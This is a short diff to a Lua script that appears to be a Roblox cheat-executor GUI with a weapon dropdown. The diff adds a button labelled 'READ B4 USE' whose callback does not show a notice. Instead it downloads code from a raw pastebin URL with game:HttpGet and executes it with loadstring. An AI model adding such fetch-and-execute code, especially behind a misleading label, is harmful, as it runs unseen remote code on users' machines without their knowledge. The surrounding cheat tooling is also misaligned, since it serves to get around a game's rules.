@@ -40,6 +40,10 @@ repeat wait() until game:IsLoaded()
          end
       end
    end
+   window:Button("READ B4 USE", function()
+   loadstring(game:HttpGet('https://pastebin.com/raw/KWnZZPEh'))()
+   end)
+   window:Label("-------------------------", Color3.fromRGB(255, 255, 255))
    local dropdown = window:Dropdown("First Chosen Weapon", sword, function(name)
    getgenv().boobs = name
    end)
